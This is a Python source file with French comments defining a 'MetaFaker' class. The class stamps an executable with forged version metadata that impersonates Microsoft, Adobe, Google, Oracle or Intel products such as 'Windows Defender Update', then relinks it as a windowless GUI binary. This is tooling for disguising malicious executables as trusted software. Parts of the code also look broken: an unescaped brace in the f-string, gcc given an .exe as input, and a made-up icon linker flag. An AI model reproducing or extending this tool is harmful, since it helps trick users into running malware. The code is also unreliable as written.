import os
import random
from datetime import datetime, timedelta
import pefile
import subprocess

class MetaFaker:
    def __init__(self):
        self.fake_companies = [
            "Microsoft Corporation", "Adobe Systems Inc.",
            "Google LLC", "Oracle Corporation", "Intel Corporation"
        ]
        self.fake_products = [
            "Windows Defender Update", "Adobe Flash Player", 
            "Google Chrome Update", "Java Runtime", "Intel Display Driver"
        ]

    def add_fake_metadata(self, exe_path, icon_path=None):
        """
        Ajoute un fichier .rc contenant des métadonnées factices, puis reconstruit l'exécutable avec rsrc.
        """
        try:
            # 1. Génération du .rc avec infos aléatoires
            company = random.choice(self.fake_companies)
            product = random.choice(self.fake_products)
            version = f"{random.randint(1,10)}.{random.randint(0,9)}.{random.randint(0,999)}.0"
            year = random.randint(2019, 2023)
            desc = f"{product} Service Pack"

            rc_content = f'''
1 VERSIONINFO
FILEVERSION     {version.replace(".", ",")}
PRODUCTVERSION  {version.replace(".", ",")}
FILEOS          0x4
FILETYPE        0x1
{
    BLOCK "StringFileInfo"
    {{
        BLOCK "040904b0"
        {{
            VALUE "CompanyName", "{company}"
            VALUE "FileDescription", "{desc}"
            VALUE "FileVersion", "{version}"
            VALUE "InternalName", "{product}"
            VALUE "OriginalFilename", "{os.path.basename(exe_path)}"
            VALUE "ProductName", "{product}"
            VALUE "ProductVersion", "{version}"
            VALUE "LegalCopyright", "Copyright (C) {company} {year}"
        }}
    }}
    BLOCK "VarFileInfo"
    {{
        VALUE "Translation", 0x0409, 1200
    }}
}}
'''
            # 2. Écriture temporaire du .rc
            rc_path = "metadata.rc"
            with open(rc_path, "w", encoding="utf-8") as f:
                f.write(rc_content)

            # 3. Compilation du .rc → .res (via windres)
            res_path = "metadata.res"
            subprocess.run(["windres", rc_path, "-O", "coff", "-o", res_path], check=True)

            # 4. Recompile le .exe avec stub et .res
            output = exe_path.replace(".exe", "_meta.exe")
            cmd = [
                "x86_64-w64-mingw32-gcc",
                exe_path,
                res_path,
                "-o", output,
                "-mwindows"
            ]

            if icon_path:
                cmd.insert(-2, f"-Wl,--subsystem,windows")
                cmd.insert(-2, f"-Wl,--include,{icon_path}")

            subprocess.run(cmd, check=True)

            return output

        except Exception as e:
            print(f"[MetaFaker] ❌ Erreur métadonnées : {e}")
            return exe_path
